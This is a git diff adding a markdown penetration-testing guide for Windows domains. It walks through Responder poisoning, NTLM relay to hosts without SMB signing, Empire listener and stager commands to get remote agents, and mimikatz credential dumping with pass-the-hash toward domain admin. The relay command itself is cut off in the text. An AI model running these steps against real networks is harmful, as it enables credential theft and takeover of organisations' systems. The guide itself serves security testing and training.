@@ -1,0 +1,66 @@
+
+
+
+### Responder with NTLM relay attack
+
+byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack. Because [b3t3bl33d3r's guide](https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+) is good I'll try to make it short.
+
+NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used
+
+With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.
+
+- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.
+
+
+#### Responder
+
+Now in the previous attack REsponder had set up an HTTP and SMB server to act as a middleman. We now want to give our captured hashes to NTLMrelay, so we edit the REsponder.conf and turn off the HTTP and SMB server.
+
+After that is done, run Responder like before:
+- `Responder -I eth0 -wrf` where eth0 is your interface. The -wrf is optional.
+
+
+#### Empire
+
+Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
+https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/
+
+```
+uselistener http
+set Port 81
+execute
+back
+usestager multi/launcher
+set Listener http
+generate
+agents
+```
+
+#### NTLMrelay
+- NTLMrelay.tx
+
+
+Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.
+
+#### Back to Empire
+
+Now I have had some trouble where agents are not always spawned or hashes are not captured. Here's what you can try:
+
+- Trigger a few requests from the Windows machines using the `\\share\` trick.
+- Restart all the tools.
+- Reset Empire's database.
+- Reboot the Windows machines.
+- Execute the payload from cmd inside a Windows computer to check if it's actually working. (You should get an agent instantly).
+
+Ok, so you have an agent now. Sometimes the interaction with agents in Empire  agent can be painstakingly slow, so have some patience when running commands. Try whoami, sysinfo and other basic commands. Sometimes, the agents timeout and you'll have to spawn new ones. Kill and/or remove old ones using `kill` and `remove`.
+
+Once you have administrator access to a box you can run mimikatz, which is bundled with Empire. If you're lucky you'll get DA creds in plaintext. If you have a local administrator hash on the hosts you can use CrackMapExec to do a mass mimikatz. Basically what it does is a pass the hash on multiple hosts, runs the mimikatz sekurlsa::loggonpasswords and returns output. Hopefully one of them is a DA and game over. Now this might be a bit confusing so lkys37en explained this the following way:
+
+>Say you're an IT administrator. You're logged into your workstation and your account has domain admin rights. I come along and pop a admin shell on another workstation. I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz. If you're running win 7 and 8 I'll get plain text plus NTLM hash. If you're running win 8.1 and above I only get the NTLM hash.
+
+ What this means is that you gain the local admin hash, and pass it to the DC which proves you are admin on DA, which allows you to do mimikatz and extract DA credentials. You're hoping the IT admins used the same local administrator account on all workstations
+
+ To check if the user is part of the Domain Admins group, run `net user "Domain Admins" /domain`
+
+ Now if you're so lucky that you're a DA you can start looking into lateral movement modules in Empire to get into the DC and have some fun.
